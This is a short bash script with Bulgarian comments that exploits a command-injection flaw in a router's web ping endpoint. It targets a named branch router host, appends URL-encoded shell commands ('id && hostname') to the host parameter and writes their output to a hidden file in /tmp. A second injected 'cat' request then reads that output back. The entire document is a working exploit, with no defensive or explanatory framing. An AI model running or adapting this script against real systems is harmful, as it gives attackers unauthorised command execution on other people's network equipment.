#!/bin/bash
# Всичко на един път – без междинни файлове, без показване

# URL частта
URL="http://edge-rt01.branch.pelican-ins.com:8080/ping?host=127.0.0.1"

# Изпълни командата на рутера (id && hostname > /tmp/.rex_ci_edge)
curl -s "${URL};id%20%26%26%20hostname%20%3E%20/tmp/.rex_ci_edge"

# Прочети резултата обратно
curl -s "${URL};cat%20/tmp/.rex_ci_edge"
